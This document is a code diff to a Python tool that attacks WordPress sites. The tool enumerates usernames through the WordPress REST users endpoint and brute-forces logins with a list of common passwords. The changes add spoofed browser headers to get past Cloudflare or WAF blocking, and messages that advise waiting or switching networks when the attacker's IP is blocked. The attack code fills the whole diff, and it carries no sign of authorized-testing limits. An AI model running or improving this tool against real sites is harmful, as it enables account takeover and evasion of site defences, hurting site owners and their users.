@@ -70,13 +70,25 @@ TOP_PASSWORDS = [
 ]
 
 
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
+                  "AppleWebKit/537.36 (KHTML, like Gecko) "
+                  "Chrome/122.0.0.0 Safari/537.36",
+    "Accept": "application/json, text/html, */*",
+    "Accept-Language": "en-US,en;q=0.9",
+}
+
+
 def enumerate_users(base_url):
     """Discover all usernames via REST API"""
     print(f"\n{BOLD}{CYAN}═══ PHASE 1: DISCOVERING ALL USERS ═══{RESET}\n")
     users_url = urljoin(base_url, "/wp-json/wp/v2/users")
+    print(f"  Target: {users_url}\n")
 
     try:
-        resp = requests.get(users_url, timeout=10)
+        resp = requests.get(users_url, headers=HEADERS, timeout=15)
+        print(f"  HTTP {resp.status_code} ({len(resp.content)} bytes)\n")
+
         if resp.status_code == 200:
             users = resp.json()
             if isinstance(users, list) and len(users) > 0:
@@ -91,7 +103,16 @@ def enumerate_users(base_url):
                     usernames.append(slug)
                 print(f"\n  {GREEN}Found {len(usernames)} accounts to test{RESET}")
                 return usernames
-        print(f"  {RED}Could not enumerate users{RESET}")
+
+        if resp.status_code == 403:
+            print(f"  {RED}HTTP 403 — Cloudflare/WAF is blocking requests.{RESET}")
+            print(f"  {YELLOW}Your IP may be temporarily blocked from previous testing.{RESET}")
+            print(f"  {YELLOW}Wait 10-15 minutes and try again, or switch networks.{RESET}")
+        elif resp.status_code == 429:
+            print(f"  {RED}HTTP 429 — Rate limited. Wait a few minutes and retry.{RESET}")
+        else:
+            print(f"  {RED}Unexpected response (HTTP {resp.status_code}).{RESET}")
+            print(f"  {YELLOW}First 200 chars: {resp.text[:200]}{RESET}")
         return []
     except requests.RequestException as e:
         print(f"  {RED}Error: {e}{RESET}")
@@ -116,8 +137,9 @@ def rotating_bruteforce(base_url, usernames, passwords, rate_per_sec):
     print(f"  Estimate:   ~{est_min:.0f} minutes")
     print()
 
-    # Create persistent session
+    # Create persistent session with browser-like headers
     session = requests.Session()
+    session.headers.update(HEADERS)
     session.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
     adapter = requests.adapters.HTTPAdapter(
         pool_connections=1, pool_maxsize=1,
@@ -126,9 +148,9 @@ def rotating_bruteforce(base_url, usernames, passwords, rate_per_sec):
     session.mount("https://", adapter)
     session.mount("http://", adapter)
 
-    # Warm up
+    # Warm up — visit login page first to get cookies
     try:
-        session.get(login_url, timeout=10)
+        session.get(login_url, timeout=15)
     except requests.RequestException:
         pass
 
